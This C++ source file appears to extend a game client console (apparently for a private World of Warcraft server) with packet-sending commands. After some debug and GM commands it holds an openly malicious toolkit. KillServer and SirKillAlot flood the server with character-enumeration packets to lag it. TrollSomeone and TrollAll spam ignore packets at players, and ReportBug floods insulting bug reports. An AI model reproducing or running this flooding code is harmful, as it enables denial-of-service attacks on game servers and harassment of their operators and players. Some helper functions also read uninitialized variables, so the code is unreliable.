#include "stdafx.h"
#include <sstream>
#include <ctime>
#include <vector>

BOOL CCommand_TestCommand(char const* cmd, char const* args)
{
    Console::Write("Hello from TestCommand: cmd '%s', args '%s'", INPUT_COLOR, cmd, args);

    uint64 guid = ObjectMgr::GetActivePlayerGuid();

	if (!guid)
	{
		Console::Write("TestCommand: Not in world!", ERROR_COLOR);
		return TRUE;
	}

    CGObject_C *pPlayer = ObjectMgr::GetObjectPtr(guid, TYPEMASK_PLAYER);

    C3Vector pos;
    pPlayer->GetPosition(pos);

    const char *model;
    BOOL result = pPlayer->GetModelFileName(&model);

    Console::Write("Local player: position x: %f y: %f z: %f, model '%s'", ECHO_COLOR, pos.X, pos.Y, pos.Z, result ? model : "Unknown");

    CGObject_C *pTarget = ObjectMgr::GetObjectPtr(pPlayer->GetValue<uint64>(UNIT_FIELD_TARGET), TYPEMASK_UNIT);

    if (pTarget)
        Console::Write("Target '%s', guid 0x%016llX", ECHO_COLOR, pTarget->GetObjectName(), pTarget->GetValue<uint64>(OBJECT_FIELD_GUID));
    else
        Console::Write("No target!", ECHO_COLOR);

    return TRUE;
}

BOOL CCommand_Beastmaster(char const* cmd, char const* args)
{
    CDataStore data(CMSG_BEASTMASTER);
    int state = _strnicmp(args, "off", INT_MAX) != 0;
    data.PutInt8(state);
    ClientServices::SendPacket(&data);

    Console::Write("Beastmaster mode is %s", ECHO_COLOR, state ? "on" : "off");

    return TRUE;
}

BOOL CCommand_Invis(char const* cmd, char const* args)
{
    CDataStore data(CMSG_GM_INVIS);
    int state = _strnicmp(args, "off", INT_MAX) != 0;
    data.PutInt32(state);
    ClientServices::SendPacket(&data);

    Console::Write("GM invis mode is %s", ECHO_COLOR, state ? "on" : "off");

    return TRUE;
}

BOOL CCommand_DBLookup(char const* cmd, char const* args)
{
    CDataStore data(CMSG_DBLOOKUP);
    data.PutString(args);
    ClientServices::SendPacket(&data);

    return TRUE;
}

BOOL ShowObjectsEnumProc(uint64 objectGuid, void *param)
{
    CGObject_C *pObject = ObjectMgr::GetObjectPtr(objectGuid, TYPEMASK_OBJECT);

    if (pObject)
		Console::Write("Object '%s', guid 0x%016llX", HIGHLIGHT_COLOR, pObject->GetObjectName(), pObject->GetValue<uint64>(OBJECT_FIELD_GUID));

    return TRUE;
}

BOOL CCommand_ShowObjects(char const* cmd, char const* args)
{
	if (!ObjectMgr::IsInWorld())
	{
		Console::Write("Error: Not in world!", ERROR_COLOR);
		return TRUE;
	}

    ObjectMgr::EnumVisibleObjects(ShowObjectsEnumProc, NULL);

    return TRUE;
}

// LILLECARL DAWG

#define MAXPACKET 100000

typedef std::vector<CGObject_C *> PlayerList;

enum Factions
{
    FACTION_HUMAN   = 1,
    FACTION_ORC     = 2,
    FACTION_DWARF   = 3,
    FACTION_NELF    = 4,
    FACTION_UNDEAD  = 5,
    FACTION_TAUREN  = 6,
    FACTION_GNOME   = 8,
    FACTION_TROLL   = 9,
    FACTION_BELF    = 914,
    FACTION_DRANAEI = 927
};

enum Team
{
    TEAM_ALLIANCE = 0,
    TEAM_HORDE,
    TEAM_NEUTRAL
};

PlayerList GetClosePlayers()
{
    PlayerList m_Players;
    for (uint64 i = 0; i < 10000000; ++i)
        if (CGObject_C *pPlayer = s_objMgr.GetObjectPtr(i, TYPEMASK_PLAYER))
            m_Players.push_back(pPlayer);

    return m_Players;
}

CGObject_C *GetPlayerSelf()
{
    return s_objMgr.GetObjectPtr(s_objMgr.GetActivePlayerGuid(), TYPEMASK_PLAYER);
}

CGObject_C *GetPlayerTarget()
{
    CGObject_C * target;
    if (CGObject_C * self = s_objMgr.GetObjectPtr(s_objMgr.GetActivePlayerGuid(), TYPEMASK_PLAYER))
        target = s_objMgr.GetObjectPtr(self->GetValue<uint64>(UNIT_FIELD_TARGET), TYPEMASK_PLAYER);

    return target ? target : NULL;
}

uint64 GetGUID()
{
    return s_objMgr.GetActivePlayerGuid();
}

uint64 GetTargetGUID()
{
    uint64 guid;
    if (CGObject_C * self = s_objMgr.GetObjectPtr(s_objMgr.GetActivePlayerGuid(), TYPEMASK_PLAYER))
        guid = self->GetValue<uint64>(UNIT_FIELD_TARGET), TYPEMASK_PLAYER;

    return guid ? guid : NULL;
}

void SendWhisper(std::string message, std::string name = "")
{
    CGObject_C *pPlayer = GetPlayerSelf();

    if (!pPlayer)
        return;

    uint32 lang = 0;

    switch (pPlayer->GetValue<uint64>(UNIT_FIELD_FACTIONTEMPLATE))
    {
    case FACTION_HUMAN:   lang = 7;  break;
    case FACTION_ORC:     lang = 1;  break;
    case FACTION_DWARF:   lang = 6;  break;
    case FACTION_NELF:    lang = 2;  break;
    case FACTION_UNDEAD:  lang = 33; break;
    case FACTION_TAUREN:  lang = 3;  break;
    case FACTION_GNOME:   lang = 13; break;
    case FACTION_TROLL:   lang = 14; break;
    case FACTION_BELF:    lang = 10; break;
    case FACTION_DRANAEI: lang = 35; break;
    default:
        return;
    }

    const char* putname = name == "" ? pPlayer->GetObjectName() : name.c_str();

    CDataStore data;
    data.PutInt32(CMSG_MESSAGECHAT);
    data.PutInt32(7); // CHAT_MSG_WHISPER
    data.PutInt32(lang);
    data.PutString(putname);
    data.PutString(message.c_str());
    data.Finalize();
    s_client.SendPacket(&data);
}

void KillServer(char const* cmd, char const* args)
{
    if (!killingalot)
        SendWhisper("Starting server lag, you will get whisper when you can lag it again!");

    long killmuch = atoi(args);

    if (killmuch > MAXPACKET)
        killmuch = MAXPACKET;

    for (long i = 0; i < killmuch; ++i)
    {
        CDataStore data;
        data.PutInt32(CMSG_CHAR_ENUM);
        data.Finalize();
        s_client.SendPacket(&data);
        Console::Write("", ECHO_COLOR);
    }

    std::ostringstream ss;
    ss << "Sent CMSG_CHAR_ENUM " << killmuch << " times";

    Console::Write(ss.str().c_str(), ECHO_COLOR);

    if (!killingalot)
        SendWhisper("DONE LAGGING, GO AGAIN!");
}

BOOL CCommand_KillServer(char const* cmd, char const* args)
{
    KillServer(cmd,args);
    return TRUE;
}

BOOL CCommand_SirKillAlot(char const* cmd, char const* args)
{
    if (!killingalot)
        return TRUE;

    Console::Write(std::to_string(std::time(0)).c_str(), ECHO_COLOR);

    KillServer(cmd,std::to_string(killalotmuch).c_str());
    CCommand_ReportBug("bugged", std::to_string(killalotmuch).c_str());
    CDataStore data;
    data.PutInt32(CMSG_GAMEOBJECT_QUERY);
    data.PutInt32(324);
    data.PutInt64(34454);
    data.Finalize();
    s_client.SendPacket(&data);

    Console::Write("", ECHO_COLOR);
    return TRUE;
}

BOOL CCommand_ToggleKillAlot(char const* cmd, char const* args)
{
    killingalot = !killingalot;

    if (killingalot)
        killalotmuch = atoi(args);
    else
        killalotmuch = 0;

    CCommand_SirKillAlot("killalot", "");

    return TRUE;
}


BOOL CCommand_TrollSomeone(char const* cmd, char const* args)
{
    uint64 trollMuch = atoi(args);

    if (trollMuch > MAXPACKET)
        trollMuch = MAXPACKET;

    for (uint64 i = 0; i < trollMuch; ++i)
    {
        CDataStore data;
        data.PutInt32(CMSG_CHAT_IGNORED);

        if (CGObject_C *pPlayer = GetPlayerSelf())
            data.PutInt64(pPlayer->GetValue<uint64>(UNIT_FIELD_TARGET)); // guid
        else
            data.PutInt64(s_objMgr.GetActivePlayerGuid()); // guid (just send own, we need to send one..)

        data.PutInt8(1); // unk
        data.Finalize();

        s_client.SendPacket(&data);
        Console::Write("", ECHO_COLOR);
    }

    SendWhisper("Spammed one player hihi");

    return TRUE;
}

BOOL CCommand_TrollAll(char const* cmd, char const* args)
{
    uint64 trollMuch = atoi(args);

    uint64 packletz = 0;


    PlayerList players = GetClosePlayers();
    for (PlayerList::const_iterator itr = players.begin(); itr != players.end(); ++itr)
    {
        CGObject_C *pPlayer = *itr;
        for (uint64 i2 = 0; i2 < trollMuch; ++i2)
        {
            bool send = true;
            CDataStore data;
            data.PutInt32(CMSG_CHAT_IGNORED);
            data.PutInt64(pPlayer->GetValue<uint64>(OBJECT_FIELD_GUID)); // guid
            data.PutInt8(1); // unk
            data.Finalize();

            if (send && packletz < MAXPACKET)
            {
                ++packletz;
                s_client.SendPacket(&data);
            }
            Console::Write("", ECHO_COLOR);
        }
    }

    SendWhisper("Spammed ignore to shitloads of players!");

    return TRUE;
}

BOOL CCommand_ReportBug(char const* cmd, char const* args)
{
    /* HOW SERVER PARSES THIS:
    uint32 suggestion, contentlen, typelen;
    std::string content, type;

    recvData >> suggestion >> contentlen >> content;
    recvData >> typelen >> type;
    */
    uint64 reallyBugged = atoi(args);

    uint64 packletz = 0;

    std::string header = "SUGGESTION: Get new developers";
    std::string message = "Hey there! I just wanted to inform you that your server developers and administration is useless!\nHave a nice day!";

    for (uint64 i = 0; i < reallyBugged; ++i)
    {
        CDataStore data;
        data.PutInt32(CMSG_BUG);
        data.PutInt32(1);
        data.PutInt32(message.length());
        data.PutString(message.c_str());
        data.PutInt32(header.length());
        data.PutString(header.c_str());
        data.Finalize();

        if (packletz < MAXPACKET)
        {
            ++packletz;
            s_client.SendPacket(&data);
        }
        Console::Write("", ECHO_COLOR);
    }

    SendWhisper("Sent this:\n"+header+"\n"+message);

    return TRUE;
}
